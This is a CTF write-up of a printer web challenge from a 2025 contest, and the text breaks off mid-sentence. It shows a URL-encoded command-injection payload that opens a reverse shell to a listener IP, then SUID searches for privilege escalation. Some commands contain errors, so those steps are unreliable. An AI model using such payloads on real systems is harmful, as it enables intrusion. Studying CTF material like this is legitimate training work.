---
title: "Huntress CTF 2025 Writeup: Phasing Through Printers"
date: 2025-11-01 16:36:48 +0100
categories: ["Huntress CTF 2025"]
tags: ["Web", "CTF", "Huntress", "Command Injection"]
image: https://raw.githubusercontent.com/AbdulRKB/img/refs/heads/main/Huntress%20CTF%202025/phasing-through-printers-1.png
---

> I found this printer on the network, and it seems to be running... a weird web page... to search for drivers?
---

Submitting the form would send a HTTP GET request to `cgi-bin/search.cgi?q=` with parameter `q`. I decided to do some common injections on the input field, and found that it was vulnerable to os command injection.


![phasing-through-printers-2.png](https://raw.githubusercontent.com/AbdulRKB/img/refs/heads/main/Huntress%20CTF%202025/phasing-through-printers-2.png)

I then decided to get an interactive reverse shell, by firstly listening on port `4444`:

![phasing-through-printers-3.png](https://raw.githubusercontent.com/AbdulRKB/img/refs/heads/main/Huntress%20CTF%202025/phasing-through-printers-3.png)

And then using [revshells](https://www.revshells.com/) to generate a shell command for the server. Upon sending the command `q=;cmd%20-i%20>%26%20%2Fdev%2Fudp%2F10.200.3.4%2F4444%200>%261`, I was In!

![phasing-through-printers-4.png](https://raw.githubusercontent.com/AbdulRKB/img/refs/heads/main/Huntress%20CTF%202025/phasing-through-printers-4.png)

I first ran the `find / -type f -name flag.txt` to find where the flag was stored. And from the result, I found out it was stored in the `root.txt` however, I couldn't view it due to permissions. So I knew the next phase of the challenge was to do privilege escalation, so I ran the command `find / -type f -perms 4000` to look for a file thats suid vulnerable.

I found a file called 
